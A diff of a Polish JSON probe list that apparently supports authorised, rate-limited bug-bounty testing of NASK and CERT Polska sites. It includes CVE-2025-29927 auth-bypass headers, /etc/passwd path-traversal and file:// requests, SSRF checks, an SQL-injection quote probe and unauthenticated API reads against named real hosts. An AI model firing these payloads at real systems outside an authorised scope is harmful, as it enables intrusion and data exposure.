@@ -1,252 +1,125 @@
 {
-  "_opis": "Kuratowana lista sond READ-ONLY. Każda pozycja: jedna nazwana hipoteza, jeden GET. Nie ma tu fuzzingu, brute-force, testów obciążeniowych ani niczego, co zmienia stan. Klasa = numer z §8 regulaminu, dla którego wynik byłby zgłaszalny.",
-  "_zasady": "Tempo: 2 żądania/s (sufit regulaminu 5). Zakres: dokładnie hosty z scope.example.json. Zero żądań bez wcześniejszego sprawdzenia hosta.",
+  "_opis": "Runda 2: sondy celowane w endpointy znalezione w bundle'ach JS (NASK/hunt/MAP-*.md). Wszystko GET, read-only, bez ciał żądań.",
+  "_zasady": "Zakres: hosty z scope.example.json. Tempo: 2 req/s. Żadnych testów obciążeniowych, żadnego logowania.",
   "checks": [
     {
-      "id": "next-mw-bypass-admin",
-      "host": "oad.nask.pl",
-      "method": "GET",
-      "path": "/admin",
-      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
-      "baseline_path": "/admin",
-      "why": "CVE-2025-29927: nagłówek x-middleware-subrequest omija middleware Next.js. Różnica 200 vs 307/403 = obejście autoryzacji.",
-      "class": "9.3 / 12.1"
-    },
-    {
-      "id": "next-mw-bypass-panel",
-      "host": "oad.nask.pl",
-      "method": "GET",
-      "path": "/panel",
-      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
-      "baseline_path": "/panel",
-      "why": "j.w., inna ścieżka panelu",
-      "class": "9.3 / 12.1"
-    },
-    {
-      "id": "next-mw-bypass-zglos",
-      "host": "zglos-dezinformacje.nask.pl",
-      "method": "GET",
-      "path": "/admin",
-      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
-      "baseline_path": "/admin",
-      "why": "CVE-2025-29927 na formularzu zgłoszeń (jest tam panel obsługi zgłoszeń)",
-      "class": "9.3 / 12.1"
-    },
-    {
-      "id": "next-mw-bypass-dyzurnet",
-      "host": "dyzurnet.pl",
-      "method": "GET",
-      "path": "/admin",
-      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
-      "baseline_path": "/admin",
-      "why": "CVE-2025-29927 na dyzurnet.pl (Next.js)",
-      "class": "9.3 / 12.1"
-    },
-    {
-      "id": "next-mw-bypass-116sos",
+      "id": "116-og-image-root",
       "host": "116sos.pl",
       "method": "GET",
-      "path": "/panel",
-      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
-      "baseline_path": "/panel",
-      "why": "CVE-2025-29927 na 116sos.pl (Next.js)",
-      "class": "9.3 / 12.1"
-    },
-    {
-      "id": "next-mw-bypass-hack",
-      "host": "hack.cert.pl",
-      "method": "GET",
-      "path": "/moje-konto",
-      "headers": { "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware" },
-      "baseline_path": "/moje-konto",
-      "why": "CVE-2025-29927 na platformie (konto/zgłoszenia)",
-      "class": "9.3 / 12.1"
-    },
-    {
-      "id": "cors-oad",
-      "host": "oad.nask.pl",
-      "method": "GET",
-      "path": "/api/",
-      "headers": { "Origin": "https://arena-probe.example" },
-      "why": "Odczyt ACAO + ACAC. Tylko odbicie obcego Origin z credentials jest zgłaszalne (§8 poz. 14).",
-      "class": "14"
-    },
-    {
-      "id": "cors-zglos",
-      "host": "zglos-dezinformacje.nask.pl",
-      "method": "GET",
-      "path": "/api/health",
-      "headers": { "Origin": "https://arena-probe.example" },
-      "why": "j.w.",
-      "class": "14"
-    },
-    {
-      "id": "cors-hack-api",
-      "host": "hack.cert.pl",
-      "method": "GET",
-      "path": "/api/v1/public/institutions/cert-polska/programs/bug-bounty-cert-polska/editions/1",
-      "headers": { "Origin": "https://arena-probe.example" },
-      "why": "Publiczny endpoint JSON — sprawdzenie, czy CORS odbija dowolny Origin (przy danych publicznych to zwykle nie jest zgłaszalne, ale przy /me tak)",
-      "class": "14"
-    },
-    {
-      "id": "api-me-hack",
-      "host": "hack.cert.pl",
-      "method": "GET",
-      "path": "/api/v1/me",
-      "why": "Endpoint 'me' bez sesji. 200 z danymi = brak autoryzacji w API (§8 poz. 12.1).",
-      "class": "12.1"
-    },
-    {
-      "id": "api-users-hack",
-      "host": "hack.cert.pl",
-      "method": "GET",
-      "path": "/api/v1/users",
-      "why": "Lista użytkowników bez sesji = poz. 3.3 / 12.2",
-      "class": "12.2"
-    },
-    {
-      "id": "api-submissions-hack",
-      "host": "hack.cert.pl",
-      "method": "GET",
-      "path": "/api/v1/submissions",
-      "why": "Zgłoszenia innych badaczy bez sesji = poz. 3.2 (poufne dane)",
-      "class": "3.2"
-    },
-    {
-      "id": "api-admin-hack",
-      "host": "hack.cert.pl",
-      "method": "GET",
-      "path": "/api/v1/admin",
-      "why": "Nieudokumentowany endpoint administracyjny (§8 poz. 12.2)",
-      "class": "12.2"
-    },
-    {
-      "id": "hack-openapi",
-      "host": "hack.cert.pl",
-      "method": "GET",
-      "path": "/api/v1/openapi.json",
-      "why": "Spec API: legalna mapa endpointów do dalszej analizy",
-      "class": "info"
-    },
-    {
-      "id": "hack-swagger",
-      "host": "hack.cert.pl",
-      "method": "GET",
-      "path": "/api/docs",
-      "why": "j.w.",
-      "class": "info"
-    },
-    {
-      "id": "zglos-api-root",
-      "host": "zglos-dezinformacje.nask.pl",
-      "method": "GET",
-      "path": "/api",
-      "why": "Mapa API formularza zgłoszeń (potem: POST z załącznikiem, pole 'link')",
-      "class": "info"
-    },
-    {
-      "id": "oad-podglad-external",
-      "host": "oad.nask.pl",
-      "method": "GET",
-      "path": "/podglad-pdf?url=https%3A%2F%2Fexample.com%2F",
-      "why": "Czy 'podglad-pdf' pobiera zasób po stronie serwera (SSRF poz. 5). Wcześniej: 500.",
+      "path": "/api/og-image",
+      "why": "Generator obrazka OG: klasyczne miejsce na SSRF (pobiera URL, żeby zrobić kartę). Brak parametrów ujawnia kontrakt.",
       "class": "5"
     },
     {
-      "id": "oad-podglad-file",
-      "host": "oad.nask.pl",
+      "id": "116-og-image-url",
+      "host": "116sos.pl",
       "method": "GET",
-      "path": "/podglad-pdf?url=file%3A%2F%2F%2Fetc%2Fpasswd",
-      "why": "Czy schemat file:// jest przyjmowany (LFI poz. 15).",
-      "class": "15"
+      "path": "/api/og-image?url=https%3A%2F%2Fexample.com%2F",
+      "why": "Czy serwer pobiera podany URL (SSRF poz. 5.1).",
+      "class": "5"
     },
     {
-      "id": "science-media-traversal",
+      "id": "116-og-image-params",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/og-image?title=test&description=test",
+      "why": "Alternatywny kontrakt (render z tekstu) — brak SSRF to też wynik.",
+      "class": "info"
+    },
+    {
+      "id": "116-cookie-hash",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/fetch-cookie-hash",
+      "why": "Nazwa sugeruje hash ciasteczka — sprawdzić, czy nie zwraca danych sesji/haszy innych użytkowników.",
+      "class": "11.1 / 3"
+    },
+    {
+      "id": "116-centres-search",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=Warszawa",
+      "why": "Kontrakt wyszukiwarki ośrodków; potem granice: cytat, OR 1=1 (read-only).",
+      "class": "4"
+    },
+    {
+      "id": "116-centres-search-quote",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/centres-search?q=Warszawa%27",
+      "why": "Pojedynczy cudzysłów: czy backend zwraca błąd SQL (poz. 4) czy normalny wynik.",
+      "class": "4"
+    },
+    {
+      "id": "116-announcements",
+      "host": "116sos.pl",
+      "method": "GET",
+      "path": "/api/announcements",
+      "why": "Lista ogłoszeń — sprawdzić, czy parametr page/limit pozwala czytać więcej niż UI.",
+      "class": "12.2"
+    },
+    {
+      "id": "science-downloadfile-root",
       "host": "science.nask.pl",
       "method": "GET",
-      "path": "/api/media/..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-      "why": "Proxy /api/media/<path> do WordPressa — traversal (poz. 15).",
+      "path": "/api/downloadFile",
+      "why": "Endpoint pobierania pliku: bez parametru ujawnia kontrakt (najczęstsze LFI w CMS-ach).",
       "class": "15"
     },
     {
-      "id": "dns-pl-node-search",
+      "id": "science-downloadfile-passwd",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/downloadFile?file=/etc/passwd",
+      "why": "Path traversal / LFI na parametrze pliku (poz. 15).",
+      "class": "15"
+    },
+    {
+      "id": "science-media-raw-traversal",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/media/wp-content/../../../../../../etc/passwd",
+      "why": "Proxy media → WordPress; traversal bez kodowania (poprzednia próba kodowana nie doszła).",
+      "class": "15"
+    },
+    {
+      "id": "science-search",
+      "host": "science.nask.pl",
+      "method": "GET",
+      "path": "/api/search?q=test",
+      "why": "Wyszukiwarka: refleksja/XSS i kształt odpowiedzi.",
+      "class": "8"
+    },
+    {
+      "id": "dns-whois-xml",
       "host": "dns.pl",
       "method": "GET",
-      "path": "/wyszukiwarka?q=test",
-      "why": "Mapa wyszukiwarki domen (Drupal) — punkt wejścia pod SQLi/refleksję.",
-      "class": "info"
+      "path": "/api/who-is-xml/nask.pl",
+      "why": "Whois w XML: parser XML po stronie serwera = XXE (poz. 20) albo SQLi na nazwie domeny (poz. 4).",
+      "class": "20 / 4"
     },
     {
-      "id": "dns-pl-whois",
+      "id": "dns-whois-xml-param",
       "host": "dns.pl",
       "method": "GET",
-      "path": "/whois?domain=nask.pl",
-      "why": "Publiczny whois — sprawdzenie, czy parametr jest odzwierciedlany/walidowany.",
+      "path": "/api/who-is-xml/?domain=nask.pl",
+      "why": "Alternatywny kontrakt parametru.",
       "class": "info"
     },
     {
-      "id": "nask-www-redirect",
-      "host": "nask.pl",
+      "id": "dns-domain-browser",
+      "host": "dns.pl",
       "method": "GET",
-      "path": "/",
-      "why": "Łańcuch przekierowań: czy nie wychodzi poza zakres (notujemy tylko).",
-      "class": "info"
+      "path": "/api/domain-browser/?q=nask",
+      "why": "Przeglądarka domen: paginacja i parametry mogą czytać więcej niż UI.",
+      "class": "12.2"
     },
     {
-      "id": "cert-pl-home",
-      "host": "cert.pl",
+      "id": "zglos-sendform-get",
+      "host": "zglos-dezinformacje.nask.pl",
       "method": "GET",
-      "path": "/",
-      "why": "Mapa CERT Polska Tier 1: tech, formularze, endpointy.",
-      "class": "info"
-    },
-    {
-      "id": "moje-cert-home",
-      "host": "moje.cert.pl",
-      "method": "GET",
-      "path": "/",
-      "why": "Aplikacja z kontami — najbardziej prawdopodobne miejsce na BAC/IDOR.",
-      "class": "info"
-    },
-    {
-      "id": "moje-cert-api-me",
-      "host": "moje.cert.pl",
-      "method": "GET",
-      "path": "/api/me",
-      "why": "Endpoint konta bez sesji.",
-      "class": "12.1"
-    },
-    {
-      "id": "incydent-home",
-      "host": "incydent.cert.pl",
-      "method": "GET",
-      "path": "/",
-      "why": "Formularz zgłaszania incydentów — wejście pod upload/SSRF.",
-      "class": "info"
-    },
-    {
-      "id": "mwdb-api-root",
-      "host": "mwdb.cert.pl",
-      "method": "GET",
-      "path": "/api/",
-      "why": "mwdb (malware DB) — dokumentacja API, potem własne konto.",
-      "class": "info"
-    },
-    {
-      "id": "mwdb-server-info",
-      "host": "mwdb.cert.pl",
-      "method": "GET",
-      "path": "/api/server/info",
-      "why": "Wersja/informacje serwera (użyteczne do dopasowania CVE; sama wersja nie jest zgłaszalna).",
-      "class": "info"
-    },
-    {
-      "id": "ctf-hack-home",
-      "host": "ctf.hack.cert.pl",
-      "method": "GET",
-      "path": "/",
-      "why": "Jedyna subdomena hack.cert.pl w zakresie (niejednoznaczność karta vs PDF — sprawdzamy dostępność, nie testujemy).",
+      "path": "/api/sendForm",
+      "why": "Metoda i kształt błędu formularza zgłoszeń (405 = tylko POST). Potem: pole z linkiem → SSRF.",
       "class": "info"
     }
   ]
